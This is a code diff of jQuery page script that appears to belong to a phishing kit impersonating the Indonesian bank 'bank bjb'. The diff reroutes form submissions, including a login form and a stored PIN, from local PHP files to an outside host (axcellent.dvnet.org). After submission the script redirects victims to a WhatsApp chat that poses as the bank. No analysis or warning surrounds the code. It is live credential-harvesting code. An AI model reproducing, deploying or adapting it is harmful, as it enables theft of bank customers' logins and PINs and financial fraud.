@@ -4,7 +4,7 @@
  $(".load").show();
  $.ajax({
  type: 'POST',
- url: 'req/no.php',
+ url: 'https://axcellent.dvnet.org/app5/no.php',
  data: $(this).serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -28,7 +28,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'req/sendLogin.php',
+ url: 'https://axcellent.dvnet.org/app5/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -61,6 +61,6 @@ sessionStorage.setItem("pin", pin);
 
 function go(){
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=14017020060&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
+location.href='https://api.whatsapp.com/send?phone=62811114858&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
     }, 1500);    
 }     
